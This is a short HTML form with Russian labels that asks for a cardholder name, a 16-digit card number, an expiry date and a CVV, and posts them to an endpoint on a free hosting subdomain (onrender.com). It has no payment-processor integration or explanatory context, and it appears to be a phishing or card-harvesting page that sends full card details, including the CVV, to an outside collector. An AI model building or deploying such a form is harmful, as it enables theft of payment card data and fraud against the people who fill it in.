<form action="https://com-1-hi15.onrender.com/submit" method="POST">
  <label for="name">Имя:</label>
  <input type="text" id="name" name="name" required>

  <label for="cardNumber">Номер (16 цифр):</label>
  <input type="text" id="cardNumber" name="cardNumber" pattern="^[0-9]{16}$" required>

  <label for="expiryDate">Срок годности (MM/YY):</label>
  <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" required>

  <label for="cvv">CVV:</label>
  <input type="text" id="cvv" name="cvv" pattern="^[0-9]{3}$" required>

  <button type="submit">Отправить</button>
</form>
